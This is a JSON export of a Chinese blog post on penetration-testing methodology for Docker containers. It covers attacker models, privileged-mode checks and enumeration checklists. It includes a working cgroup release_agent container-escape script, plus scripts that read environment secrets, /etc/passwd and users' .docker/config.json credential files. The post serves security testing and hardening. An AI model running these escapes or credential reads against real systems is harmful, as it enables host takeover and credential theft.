{"title":"容器安全-针对容器的渗透测试方法","uid":"187ba77175374873452e35cc1b1a9ffe","slug":"针对容器的渗透测试方法","date":"2022-04-11T03:36:00.000Z","updated":"2022-10-27T02:29:32.680Z","comments":true,"path":"api/articles/针对容器的渗透测试方法.json","keywords":null,"cover":"https://gtwallpaper.org/sites/default/files/wallpaper/159415/4k-beautiful-sunrise-reflection-wallpapers-159415-2155406-2770784.png","content":"<h2 id=\"攻击者模型\"><a href=\"#攻击者模型\" class=\"headerlink\" title=\"攻击者模型\"></a>攻击者模型</h2><p>攻击者模型<code>容器逃逸</code>和<code>针对Docker守护进程的攻击</code>，分别对应位于容器内部的攻击者和位于运行了Docker守护进程的宿主机上的攻击者。</p>\n<p>其中，容器逃逸包括容器内进程影响到宿主机或其他容器两种情况，示意图如下：<br><img src=\"https://s2.loli.net/2022/02/09/PTtUWxdCwqupGzO.jpg\"></p>\n<p>针对Docker守护进程的攻击则指宿主机上低权限攻击者借助Docker守护进程获取到敏感数据或更高权限，示意图如下：<br><img src=\"https://s2.loli.net/2022/02/09/eWVmJtzNAgQM435.jpg\"></p>\n<p>![[A_Methodology_for_Penetration_Testing_Docker_Systems.pdf]]<br>Sari Sultan等人对整个容器环境的潜在攻击面和攻击对象进行梳理，抽象出四类威胁：<br><img src=\"https://s2.loli.net/2022/02/09/pySfjAihBOMIEr2.jpg\"></p>\n<h2 id=\"安全问题\"><a href=\"#安全问题\" class=\"headerlink\" title=\"安全问题\"></a>安全问题</h2><p><img src=\"https://s2.loli.net/2022/02/09/QoO6sIc2ANf9REd.jpg\"></p>\n<h2 id=\"测试方法\"><a href=\"#测试方法\" class=\"headerlink\" title=\"测试方法\"></a>测试方法</h2><p><img src=\"https://s2.loli.net/2022/02/09/eFu9fbmtzw1ESDH.jpg\"></p>\n<h3 id=\"环境变量读取\"><a href=\"#环境变量读取\" class=\"headerlink\" title=\"环境变量读取\"></a>环境变量读取</h3><p>环境变量本身是一种常用的宿主机与容器的通信方式。然而，作为容器内的攻击者，他同样获得环境变量中可能存在的敏感信息，从而扩大战果，如借助环境变量设置数据库访问凭证的场景：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">(host)$ docker run --rm -e MYSQL_ROOT_PASSWORD&#x3D;supersecret -- name&#x3D;database mariadb:latest\n(host)$ docker exec -it database bash (cont)# env  \n...\nMYSQL_ROOT_PASSWORD&#x3D;supersecret</code></pre>\n<h3 id=\"特权模式检查\"><a href=\"#特权模式检查\" class=\"headerlink\" title=\"特权模式检查\"></a>特权模式检查</h3><p>对于容器内的攻击者来说，特权模式几乎就意味着容器逃逸。如下所示，特权模式意味着容器内进程将具备等同于宿主机上进程的所有权限：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">(host)$ docker run -it --rm --privileged ubuntu:latest grep CapEff &#x2F;proc&#x2F;1&#x2F;status\n\nCapEff: 0000003fffffffff  \n(host)$ capsh --decode&#x3D;0000003fffffffff 0x0000003fffffffff&#x3D;cap_chown,cap_dac_override,\n\ncap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,\ncap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,\ncap_net_bind_service,cap_net_broadcast,cap_net_admin,\ncap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,\ncap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct, \n\ncap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,\ncap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,\ncap_audit_write,cap_audit_control,cap_setfcap,\ncap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,\ncap_block_suspend,cap_audit_read</code></pre>\n\n<h2 id=\"借助特权模式进行容器逃逸的方法\"><a href=\"#借助特权模式进行容器逃逸的方法\" class=\"headerlink\" title=\"借助特权模式进行容器逃逸的方法\"></a>借助特权模式进行容器逃逸的方法</h2><p>1.启动一个特权容器</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run --rm -it --privileged ubuntu bash</code></pre>\n<p>2.在容器内执行命令读取宿主机进程列表</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"># In the container\nmkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o memory cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x\n \necho 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release\nhost_path&#x3D;&#96;sed -n &#39;s&#x2F;.*\\perdir&#x3D;\\([^,]*\\).*&#x2F;\\1&#x2F;p&#39; &#x2F;etc&#x2F;mtab&#96;\necho &quot;$host_path&#x2F;cmd&quot; &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent\n \necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;cmd\necho &quot;ps aux &gt; $host_path&#x2F;output&quot; &gt;&gt; &#x2F;cmd\nchmod a+x &#x2F;cmd\n \nsh -c &quot;echo \\$\\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs&quot;</code></pre>\n<p>3.方法原理<br>该攻击手法实际上利用了Linux cgroup v1的<a href=\"https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt\">notify_on_release</a>特性，在普通容器中，由于不具有SYS_ADMIN权限，以及AppArmor的限制，这种攻击无法成功。因此，特权模式是危险的。</p>\n<h2 id=\"渗透测试速查表\"><a href=\"#渗透测试速查表\" class=\"headerlink\" title=\"渗透测试速查表\"></a>渗透测试速查表</h2><h3 id=\"探测是否是容器环境\"><a href=\"#探测是否是容器环境\" class=\"headerlink\" title=\"探测是否是容器环境\"></a>探测是否是容器环境</h3><p>问题：<code>/.dockerenv</code>文件是否存在？</p>\n<p>操作：执行<code>ls /.dockerenv</code>查看。</p>\n<p>问题：<code>/proc/1/cgroup</code>中是否包括<code>/docker</code>字样？</p>\n<p>操作：执行<code>grep &#39;/docker&#39; /proc/1/cgroup</code>查看。</p>\n<p>问题：当前环境内的进程数是否少于5个？</p>\n<p>操作：执行<code>ps aux</code>查看。</p>\n<p>问题：PID为1的进程是否是常规init进程（如systemd或init）？</p>\n<p>操作：执行<code>ps -p1</code>查看PID为1的进程。</p>\n<p>问题：当前环境是否缺少常见库或工具？</p>\n<p>操作：执行<code>which xxx</code>来查看常用工具是否存在，例如执行<code>which sudo</code>来查看sudo是否存在。</p>\n<h3 id=\"自动化脚本\"><a href=\"#自动化脚本\" class=\"headerlink\" title=\"自动化脚本\"></a>自动化脚本</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">#!&#x2F;bin&#x2F;bash\n\nDOCKER_ENV_FILE&#x3D;&#x2F;.dockerenv\nDOCKER&#x3D;docker\nDOCKER_CGROUP&#x3D;&#x2F;proc&#x2F;1&#x2F;cgroup\n\nls -al $DOCKER_ENV_FILE\ngrep &quot;$DOCKER&quot; $DOCKER_CGROUP\nps aux\nps -p1\nwhich sudo\nwhich apt\nwhich vi\nwhich ping\nwhich ssh</code></pre>\n\n<h3 id=\"从容器内发起测试\"><a href=\"#从容器内发起测试\" class=\"headerlink\" title=\"从容器内发起测试\"></a>从容器内发起测试</h3><p>问题：当前用户是？</p>\n<p>操作：执行<code>id</code>查看当前用户和用户组。</p>\n<p>问题：当前环境中存在哪些用户？</p>\n<p>操作：读取<code>/etc/passwd</code>数据，例如<code>cat /etc/passwd</code>。</p>\n<p>问题：容器操作系统是？</p>\n<p>操作：读取<code>/etc/os-release</code>数据，获得操作系统相关信息。</p>\n<p>问题：有哪些进程在容器内运行？</p>\n<p>操作：执行<code>ps aux</code>查看。</p>\n<p>问题：宿主机内核版本是？</p>\n<p>操作：执行<code>uname -a</code>查看。</p>\n<p>问题：容器内进程具有哪些权限（capabilities）？</p>\n<p>操作：执行<code>grep CapEff /proc/self/status</code>获得权限值，在其他系统上执行<code>capsh --decode=value</code>将前面获得的值解析为具体权限。例如：<br><img src=\"https://s2.loli.net/2022/02/09/vJEimhPSCIR9a65.jpg\"><br>问题：当前容器是否运行在特权模式？</p>\n<p>操作：如果上一步中得到的权限值为<code>0000003fffffffff</code>，那么容器就运行在特权模式，我们就能够进行容器逃逸。</p>\n<p>问题：容器挂载了哪些卷？</p>\n<p>操作：读取<code>/proc/mounts</code>数据，查看卷挂载情况。</p>\n<p>问题：环境变量中是否存储了敏感信息？</p>\n<p>操作：执行<code>env</code>命令，列举所有环境变量。</p>\n<p>问题：容器内是否挂载了Docker Socket？</p>\n<p>操作：检查<code>/proc/mounts</code>是否包含<code>docker.sock</code>或类似文件。通常<code>/run/docker.sock</code>或<code>/var/run/docker.sock</code>会是挂载点。如果发现挂载，我们就能够进行容器逃逸。</p>\n<p>问题：哪些主机是当前环境下网络可达的？</p>\n<p>操作：有条件的话应该使用<code>nmap</code>探测。还可以先读取<code>/etc/hosts</code>查看容器的IP地址。</p>\n<h3 id=\"自动化脚本-1\"><a href=\"#自动化脚本-1\" class=\"headerlink\" title=\"自动化脚本\"></a>自动化脚本</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">#!&#x2F;bin&#x2F;bash\n\nid\ncat &#x2F;etc&#x2F;passwd\ncat &#x2F;etc&#x2F;os-release\nps aux\nuname -a\ngrep CapEff &#x2F;proc&#x2F;self&#x2F;status\nCAP&#x3D;&#96;grep CapEff &#x2F;proc&#x2F;self&#x2F;status | cut  -f 2&#96;\nif [ &quot;$CAP&quot; &#x3D; &quot;0000003fffffffff&quot; ]; then\n\techo -e &quot;Container is privileged.&quot;\nelse\n\techo -e &quot;Container is not privileged.&quot;\nfi\ncat &#x2F;proc&#x2F;mounts\nenv\ncat &#x2F;proc&#x2F;mounts | grep docker.sock\ncat &#x2F;etc&#x2F;hosts</code></pre>\n\n<h3 id=\"从运行Docker守护进程的宿主机上发起测试\"><a href=\"#从运行Docker守护进程的宿主机上发起测试\" class=\"headerlink\" title=\"从运行Docker守护进程的宿主机上发起测试\"></a>从运行Docker守护进程的宿主机上发起测试</h3><p>问题：Docker版本是多少？</p>\n<p>操作：执行<code>docker --version</code>查看。我们可以据此判断一些已知漏洞是否存在。</p>\n<p>问题：哪些CIS条目没有被正确地配置？<br>使用<a href=\"https://github.com/docker/docker-bench-security\">docker-bench-security</a>检查配置<br><img src=\"https://s2.loli.net/2022/02/09/QDVKH5OWZwYnyBd.jpg\"><br>问题：哪些用户被允许与Docker Socket交互？</p>\n<p>操作：执行<code>ls -l /var/run/docker.sock</code>来查看<code>/var/run/docker.sock</code>所属用户和用户组，以及哪些用户对其有读写权限。</p>\n<p>问题：哪些用户在<code>docker</code>用户组中？</p>\n<p>操作：执行<code>grep docker /etc/group</code>查看。</p>\n<p>问题：Docker客户端工具是否设置了setuid标志位？</p>\n<p>操作：执行<code>ls -l $(which docker)</code>查看。</p>\n<p>问题：当前宿主机上有哪些可用镜像？</p>\n<p>操作：执行<code>docker images -a</code>查看。</p>\n<p>问题：当前宿主机上有哪些容器？</p>\n<p>操作：执行<code>docker ps -a</code>查看。</p>\n<p>问题：Docker守护进程是如何启动的（带了哪些参数）？</p>\n<p>操作：读取配置文件，例如<code>/usr/lib/systemd/system/docker.service</code>和<code>/etc/docker/daemon.json</code>来查看。</p>\n<p>问题：当前宿主机上是否存在一些<code>docker-compose.yaml</code>文件？</p>\n<p>操作：执行<code>find / -name &quot;docker-compose.*&quot;</code>查看。</p>\n<p>问题：当前宿主机上是否存在<code>.docker/config.json</code>文件？</p>\n<p>操作：执行<code>cat /home/*/.docker/config.json</code>来读取任何可能存在的<code>.docker/config.json</code>文件。</p>\n<p>问题：iptables规则集是否同时为宿主机和容器设置？</p>\n<p>操作：执行<code>iptables -vnL</code>或<code>iptables -t filter -vnL</code>查看。</p>\n<h3 id=\"自动化脚本-2\"><a href=\"#自动化脚本-2\" class=\"headerlink\" title=\"自动化脚本\"></a>自动化脚本</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">#!&#x2F;bin&#x2F;bash\n\nls -l &#x2F;var&#x2F;run&#x2F;docker.sock\ngrep docker &#x2F;etc&#x2F;group\nls -l $(which docker)\ndocker images -a\ndocker ps -a\ncat &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;docker&#x2F;daemon.json\nfind &#x2F; -name &quot;docker-compose.*&quot;\ncat &#x2F;home&#x2F;*&#x2F;.docker&#x2F;config.json\niptables -t filter -vnL</code></pre>\n\n","text":"攻击者模型攻击者模型容器逃逸和针对Docker守护进程的攻击，分别对应位于容器内部的攻击者和位于运行了Docker守护进程的宿主机上的攻击者。 其中，容器逃逸包括容器内进程影响到宿主机或其他容器两种情况，示意图如下： 针对Docker守护进程的攻击则指宿主机上低权限攻击者借助Do...","link":"","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"Cloud-Native-Security","slug":"Cloud-Native-Security","count":12,"path":"api/categories/Cloud-Native-Security.json"}],"tags":[{"name":"容器安全","slug":"容器安全","count":3,"path":"api/tags/容器安全.json"},{"name":"优秀文章收藏","slug":"优秀文章收藏","count":5,"path":"api/tags/优秀文章收藏.json"},{"name":"渗透测试","slug":"渗透测试","count":1,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E8%80%85%E6%A8%A1%E5%9E%8B\"><span class=\"toc-text\">攻击者模型</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">安全问题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">测试方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">环境变量读取</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E6%A3%80%E6%9F%A5\"><span class=\"toc-text\">特权模式检查</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%80%9F%E5%8A%A9%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E7%9A%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">借助特权模式进行容器逃逸的方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8\"><span class=\"toc-text\">渗透测试速查表</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E6%98%AF%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">探测是否是容器环境</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">自动化脚本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8E%E5%AE%B9%E5%99%A8%E5%86%85%E5%8F%91%E8%B5%B7%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">从容器内发起测试</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC-1\"><span class=\"toc-text\">自动化脚本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8E%E8%BF%90%E8%A1%8CDocker%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%B8%8A%E5%8F%91%E8%B5%B7%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">从运行Docker守护进程的宿主机上发起测试</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC-2\"><span class=\"toc-text\">自动化脚本</span></a></li></ol></li></ol>","author":{"name":"Moses","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一位正在重塑知识的技术人","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"容器安全平台-deepfence-ThreatMapper","uid":"f8440a3d154328a49baadf9056bbbcfd","slug":"容器安全平台-deepfence-ThreatMapper","date":"2022-04-21T03:36:00.000Z","updated":"2022-10-27T02:15:45.038Z","comments":true,"path":"api/articles/容器安全平台-deepfence-ThreatMapper.json","keywords":null,"cover":"https://gtwallpaper.org/sites/default/files/wallpaper/159422/4k-empty-road-new-wallpapers-159422-9856-8946046.png","text":"容器安全平台-deepfence0x01简介ThreatMapper 开源云原生安全可观测性平台 0x02架构图Deepfence Threat由两部分组成： Management Console:管理端包括应用拓扑、一般SBOMs漏洞、威胁地图 ThreatMapper Sen...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"Cloud-Native-Security","slug":"Cloud-Native-Security","count":12,"path":"api/categories/Cloud-Native-Security.json"}],"tags":[{"name":"容器安全平台","slug":"容器安全平台","count":5,"path":"api/tags/容器安全平台.json"},{"name":"产品选型","slug":"产品选型","count":6,"path":"api/tags/产品选型.json"},{"name":"开源云原生安全","slug":"开源云原生安全","count":1,"path":"api/tags/开源云原生安全.json"},{"name":"DeepFence","slug":"DeepFence","count":1,"path":"api/tags/DeepFence.json"},{"name":"云原生威胁地图","slug":"云原生威胁地图","count":1,"path":"api/tags/云原生威胁地图.json"}],"author":{"name":"Moses","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一位正在重塑知识的技术人","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"开源漏洞库工具-OpenCVE","uid":"c1f27b84e7a962a64fb70a195391b7ba","slug":"搭建漏洞库-OpenCVE","date":"2022-04-08T07:56:44.000Z","updated":"2022-10-26T07:53:48.607Z","comments":true,"path":"api/articles/搭建漏洞库-OpenCVE.json","keywords":null,"cover":"https://images.unsplash.com/photo-1571361656693-d7602246ce3c?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=628&ixid=MnwxfDB8MXxhbGx8fHx8fHx8fHwxNjE5ODc0NTE5&ixlib=rb-1.2.1&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1200","text":"简介OpenCVE是一个平台，用于本地导入CVE列表并对其进行搜索（按供应商、产品、CVSS、CWE…）。 项目地址OpenCVE 文档OpenCVE Documentation 原理 数据源 CPE: https://nvd.nist.gov/feeds/xml/cpe/dic...","link":"","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"软件供应链安全","slug":"软件供应链安全","count":26,"path":"api/categories/软件供应链安全.json"}],"tags":[{"name":"开源漏洞库","slug":"开源漏洞库","count":2,"path":"api/tags/开源漏洞库.json"},{"name":"部署手册","slug":"部署手册","count":3,"path":"api/tags/部署手册.json"},{"name":"OpenCVE","slug":"OpenCVE","count":1,"path":"api/tags/OpenCVE.json"}],"author":{"name":"Moses","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一位正在重塑知识的技术人","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}